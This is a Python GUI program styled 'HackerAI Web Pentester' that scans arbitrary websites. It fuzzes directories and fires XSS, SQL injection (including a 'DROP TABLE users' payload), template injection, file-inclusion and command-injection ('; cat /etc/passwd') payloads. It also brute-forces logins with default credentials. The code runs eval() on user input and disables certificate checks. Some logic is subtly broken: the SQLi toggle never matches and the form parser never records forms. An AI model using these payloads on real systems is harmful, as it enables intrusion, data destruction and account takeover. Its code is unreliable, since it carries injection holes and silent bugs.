import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import requests
from urllib.parse import urlparse, urljoin
import socket
import re
import time
from html.parser import HTMLParser
import ssl
import base64
import urllib.parse

class WebPentestGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("HackerAI Web Pentester v2.0")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.setup_ui()
    
    def setup_ui(self):
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook', background='#2d2d2d')
        style.configure('TFrame', background='#1e1e1e')
        
        # Main notebook
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Tabs
        self.recon_tab = ttk.Frame(self.notebook)
        self.scan_tab = ttk.Frame(self.notebook)
        self.exploit_tab = ttk.Frame(self.notebook)
        self.results_tab = ttk.Frame(self.notebook)
        
        self.notebook.add(self.recon_tab, text="Recon")
        self.notebook.add(self.scan_tab, text="Scanner")
        self.notebook.add(self.exploit_tab, text="POST Tester")
        self.notebook.add(self.results_tab, text="Results")
        
        self.setup_recon_tab()
        self.setup_scan_tab()
        self.setup_exploit_tab()
        self.setup_results_tab()
    
    def setup_recon_tab(self):
        # Target input
        ttk.Label(self.recon_tab, text="Target URL:").pack(pady=5)
        self.target_url = tk.Entry(self.recon_tab, font=('Consolas', 10), width=80)
        self.target_url.pack(pady=5)
        self.target_url.insert(0, "http://example.com")
        
        # Buttons frame
        btn_frame = ttk.Frame(self.recon_tab)
        btn_frame.pack(pady=10)
        
        ttk.Button(btn_frame, text="Quick Recon", command=self.quick_recon).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Find Forms", command=self.find_forms).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Dir Fuzz", command=self.dir_fuzz).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="DNS Lookup", command=self.dns_lookup).pack(side='left', padx=5)
        
        # Output
        self.recon_output = scrolledtext.ScrolledText(self.recon_tab, height=25, bg='#0d1b2a', fg='#90ee90', font=('Consolas', 9))
        self.recon_output.pack(fill='both', expand=True, padx=5, pady=5)
    
    def setup_scan_tab(self):
        ttk.Label(self.scan_tab, text="Vulnerability Scanner", font=('Arial', 14, 'bold')).pack(pady=10)
        
        # Scan options
        options_frame = ttk.LabelFrame(self.scan_tab, text="Scan Options")
        options_frame.pack(fill='x', padx=10, pady=5)
        
        self.scan_xss = tk.BooleanVar(value=True)
        self.scan_sql = tk.BooleanVar(value=True)
        self.scan_ssti = tk.BooleanVar(value=True)
        self.scan_lfi = tk.BooleanVar(value=True)
        
        ttk.Checkbutton(options_frame, text="XSS", variable=self.scan_xss).pack(anchor='w', padx=10, pady=2)
        ttk.Checkbutton(options_frame, text="SQLi", variable=self.scan_sql).pack(anchor='w', padx=10, pady=2)
        ttk.Checkbutton(options_frame, text="SSTI", variable=self.scan_ssti).pack(anchor='w', padx=10, pady=2)
        ttk.Checkbutton(options_frame, text="LFI", variable=self.scan_lfi).pack(anchor='w', padx=10, pady=2)
        
        ttk.Button(self.scan_tab, text="Start Scan", command=self.start_scan).pack(pady=10)
        
        self.scan_output = scrolledtext.ScrolledText(self.scan_tab, height=25, bg='#0d1b2a', fg='#90ee90', font=('Consolas', 9))
        self.scan_output.pack(fill='both', expand=True, padx=10, pady=5)
    
    def setup_exploit_tab(self):
        ttk.Label(self.exploit_tab, text="POST Data Tester", font=('Arial', 14, 'bold')).pack(pady=10)
        
        # Form data input
        ttk.Label(self.exploit_tab, text="POST URL:").pack()
        self.post_url = tk.Entry(self.exploit_tab, font=('Consolas', 10), width=80)
        self.post_url.pack(pady=5)
        
        ttk.Label(self.exploit_tab, text="POST Data (JSON):").pack()
        self.post_data = tk.Text(self.exploit_tab, height=6, width=80)
        self.post_data.pack(pady=5)
        self.post_data.insert('1.0', '{"username":"test","password":"test"}')
        
        # Payloads
        ttk.Label(self.exploit_tab, text="Payload Type:").pack()
        self.payload_type = ttk.Combobox(self.exploit_tab, values=["Normal", "SQLi", "XSS", "Command", "SSTI"], state="readonly")
        self.payload_type.set("Normal")
        self.payload_type.pack(pady=5)
        
        btn_frame = ttk.Frame(self.exploit_tab)
        btn_frame.pack(pady=10)
        
        ttk.Button(btn_frame, text="Send POST", command=self.send_post).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Fuzz POST", command=self.fuzz_post).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Brute Force", command=self.brute_post).pack(side='left', padx=5)
        
        self.post_output = scrolledtext.ScrolledText(self.exploit_tab, height=20, bg='#0d1b2a', fg='#90ee90', font=('Consolas', 9))
        self.post_output.pack(fill='both', expand=True, padx=10, pady=5)
    
    def setup_results_tab(self):
        self.results_tree = ttk.Treeview(self.results_tab, columns=('Type', 'URL', 'Payload', 'Status'), show='headings')
        self.results_tree.heading('Type', text='Vuln Type')
        self.results_tree.heading('URL', text='URL')
        self.results_tree.heading('Payload', text='Payload')
        self.results_tree.heading('Status', text='Status')
        self.results_tree.pack(fill='both', expand=True, padx=10, pady=10)
        
        ttk.Button(self.results_tab, text="Export Results", command=self.export_results).pack(pady=5)
    
    def log(self, output_widget, message, color='white'):
        def update_log():
            output_widget.insert('end', f"[{time.strftime('%H:%M:%S')}] {message}\n")
            output_widget.see('end')
            output_widget.update()
        self.root.after(0, update_log)
    
    def quick_recon(self):
        def run():
            url = self.target_url.get().strip()
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            self.log(self.recon_output, f"Starting recon on {url}")
            
            # Basic info
            try:
                resp = self.session.get(url, timeout=10, verify=False)
                self.log(self.recon_output, f"Status: {resp.status_code}")
                self.log(self.recon_output, f"Title: {self.extract_title(resp.text)}")
                self.log(self.recon_output, f"Server: {resp.headers.get('Server', 'Unknown')}")
                self.log(self.recon_output, f"Tech: {self.detect_tech(resp.text, resp.headers)}")
            except Exception as e:
                self.log(self.recon_output, f"Error: {str(e)}", 'red')
        
        threading.Thread(target=run, daemon=True).start()
    
    def find_forms(self):
        def run():
            url = self.target_url.get().strip()
            try:
                resp = self.session.get(url, timeout=10, verify=False)
                forms = self.parse_forms(resp.text)
                self.log(self.recon_output, f"Found {len(forms)} forms:")
                for i, form in enumerate(forms, 1):
                    self.log(self.recon_output, f"Form {i}: action={form['action']}, method={form['method']}")
                    for input_field in form['inputs']:
                        self.log(self.recon_output, f"  - {input_field['name']} ({input_field['type']})")
            except Exception as e:
                self.log(self.recon_output, f"Error: {str(e)}")
        
        threading.Thread(target=run, daemon=True).start()
    
    def dir_fuzz(self):
        common_dirs = ['admin', 'login', 'wp-admin', 'administrator', 'test', 'backup', 'api', 'config']
        def run():
            base = self.target_url.get().rstrip('/')
            for dir_name in common_dirs:
                test_url = f"{base}/{dir_name}"
                try:
                    resp = self.session.get(test_url, timeout=5, verify=False)
                    if resp.status_code == 200:
                        self.log(self.recon_output, f"FOUND: {test_url} (200)", 'green')
                    elif resp.status_code == 403:
                        self.log(self.recon_output, f"403: {test_url}")
                except:
                    pass
        threading.Thread(target=run, daemon=True).start()
    
    def start_scan(self):
        def run():
            target = self.target_url.get()
            payloads = {
                'xss': ["<script>alert(1)</script>", "'\"><script>alert(1)</script>", "javascript:alert(1)"],
                'sqli': ["' OR 1=1--", "' UNION SELECT NULL--", "'; DROP TABLE users--"],
                'ssti': ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
                'lfi': ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"]
            }
            
            for vuln_type, payload_list in payloads.items():
                if (vuln_type == 'xss' and not self.scan_xss.get()) or \
                   (vuln_type == 'sql' and not self.scan_sql.get()) or \
                   (vuln_type == 'ssti' and not self.scan_ssti.get()) or \
                   (vuln_type == 'lfi' and not self.scan_lfi.get()):
                    continue
                
                self.log(self.scan_output, f"Testing {vuln_type.upper()}...")
                for payload in payload_list:
                    test_url = f"{target}?test={urllib.parse.quote(payload)}"
                    try:
                        resp = self.session.get(test_url, timeout=5, verify=False)
                        if self.check_vuln(resp.text, payload, vuln_type):
                            self.log(self.scan_output, f"POTENTIAL {vuln_type.upper()}: {test_url}", 'red')
                            self.results_tree.insert('', 'end', values=(vuln_type.upper(), test_url, payload, 'Potential'))
                    except:
                        pass
        threading.Thread(target=run, daemon=True).start()
    
    def send_post(self):
        def run():
            url = self.post_url.get()
            data = self.post_data.get('1.0', 'end-1c')
            
            payload_type = self.payload_type.get()
            if payload_type != "Normal":
                data = self.inject_payload(data, payload_type)
            
            try:
                resp = self.session.post(url, json=eval(data) if data.startswith('{') else data, timeout=10, verify=False)
                self.log(self.post_output, f"POST {url}")
                self.log(self.post_output, f"Status: {resp.status_code}")
                self.log(self.post_output, f"Response: {resp.text[:500]}...")
            except Exception as e:
                self.log(self.post_output, f"Error: {str(e)}", 'red')
        
        threading.Thread(target=run, daemon=True).start()
    
    def fuzz_post(self):
        usernames = ['admin', 'user', 'test', 'guest']
        passwords = ['admin', 'password', '123456', 'test']
        
        def run():
            url = self.post_url.get()
            base_data = self.post_data.get('1.0', 'end-1c')
            
            for user in usernames:
                for pwd in passwords:
                    data = base_data.replace('test', user).replace('password', pwd)
                    try:
                        resp = self.session.post(url, data=data, timeout=5, verify=False)
                        if resp.status_code == 200 and len(resp.text) > 1000:  # Success indicator
                            self.log(self.post_output, f"HIT: {user}:{pwd} -> {resp.status_code}", 'green')
                    except:
                        pass
        threading.Thread(target=run, daemon=True).start()
    
    def inject_payload(self, data, payload_type):
        # Simple payload injection - modify for your specific needs
        if payload_type == "SQLi":
            return data.replace('"test"', '" OR 1=1--')
        elif payload_type == "XSS":
            return data.replace('"test"', '" onmouseover="alert(1)"')
        elif payload_type == "Command":
            return data.replace('"test"', '; cat /etc/passwd')
        elif payload_type == "SSTI":
            return data.replace('"test"', '{{7*7}}')
        return data
    
    def check_vuln(self, content, payload, vuln_type):
        content_lower = content.lower()
        if vuln_type == 'xss' and ('alert(1)' in content_lower or payload.lower() in content_lower):
            return True
        if vuln_type == 'sqli' and ('mysql' in content_lower or 'sql syntax' in content_lower):
            return True
        if vuln_type == 'ssti' and '49' in content:
            return True
        return False
    
    def extract_title(self, html):
        match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
        return match.group(1).strip() if match else "No title"
    
    def detect_tech(self, html, headers):
        tech = []
        if 'wordpress' in html.lower():
            tech.append('WordPress')
        if 'drupal' in html.lower():
            tech.append('Drupal')
        if 'x-powered-by' in headers:
            tech.append(headers['x-powered-by'])
        return ', '.join(tech) or 'Unknown'
    
    def parse_forms(self, html):
        class FormParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.forms = []
                self.current_form = None
                self.current_input = {}
            
            def handle_starttag(self, tag, attrs):
                attrs_dict = dict(attrs)
                if tag == 'form':
                    self.current_form = {'action': attrs_dict.get('action', ''), 'method': attrs_dict.get('method', 'get'), 'inputs': []}
                elif tag == 'input' and self.current_form:
                    self.current_input = {'name': attrs_dict.get('name', ''), 'type': attrs_dict.get('type', 'text')}
                    self.current_form['inputs'].append(self.current_input)
                elif tag == '/form' and self.current_form:
                    self.forms.append(self.current_form)
                    self.current_form = None
        
        parser = FormParser()
        parser.feed(html)
        return parser.forms
    
    def dns_lookup(self):
        hostname = urlparse(self.target_url.get()).netloc or self.target_url.get()
        try:
            ip = socket.gethostbyname(hostname)
            self.log(self.recon_output, f"DNS: {hostname} -> {ip}")
        except Exception as e:
            self.log(self.recon_output, f"DNS lookup failed: {e}")
    
    def export_results(self):
        with open('pentest_results.txt', 'w') as f:
            for item in self.results_tree.get_children():
                f.write(f"{self.results_tree.item(item)['values']}\n")
        messagebox.showinfo("Export", "Results exported to pentest_results.txt")
    
    def brute_post(self):
        # Placeholder for more advanced brute forcing
        self.log(self.post_output, "Brute force functionality - customize payloads above")

if __name__ == "__main__":
    root = tk.Tk()
    app = WebPentestGUI(root)
    root.mainloop()